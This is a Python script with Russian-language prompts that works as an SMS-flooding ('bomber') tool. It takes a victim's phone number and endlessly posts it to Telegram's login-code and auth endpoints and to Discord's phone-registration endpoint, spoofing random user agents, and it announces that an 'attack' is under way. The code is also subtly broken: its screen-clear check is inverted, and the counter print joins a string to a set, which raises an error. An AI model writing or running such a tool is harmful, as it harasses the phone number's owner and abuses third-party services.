import requests
import fake_useragent
import colorama
import os
def clear():
    os.system("clear" if os.name == "nt" else "cls")
clear()
green = colorama.Fore.LIGHTGREEN_EX
user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
number = int(input(green + '[?] Введите номер телефона -> '))
count = 9999
nomer = number

try:
    while True:
        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        print(number)
        count += 1
        print(green + "[!] Происходит атака, всего отправлено " + {count} + " сообщений")
except Exception as e:
      input(green + "[!] Произошла ошибка, перепроверьте вводимые данные и нажмите ENTER для возврата в главное меню\n")
      clear()
      os.system("python main.py")
